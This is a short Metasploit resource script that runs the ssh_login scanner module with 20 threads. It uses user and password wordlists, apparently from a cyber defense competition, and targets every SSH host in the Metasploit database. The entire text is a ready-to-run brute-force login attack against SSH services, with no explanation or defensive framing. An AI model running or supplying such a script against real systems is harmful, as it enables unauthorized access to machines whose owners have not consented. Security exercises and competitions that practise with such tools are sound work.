use auxiliary/scanner/ssh/ssh_login
set threads 20
setg USER_FILE cdc_linux_user.txt
setg PASS_FILE cdc_linux_pass.txt
services -c name -S ssh -R
set VERBOSE true
exploit -j
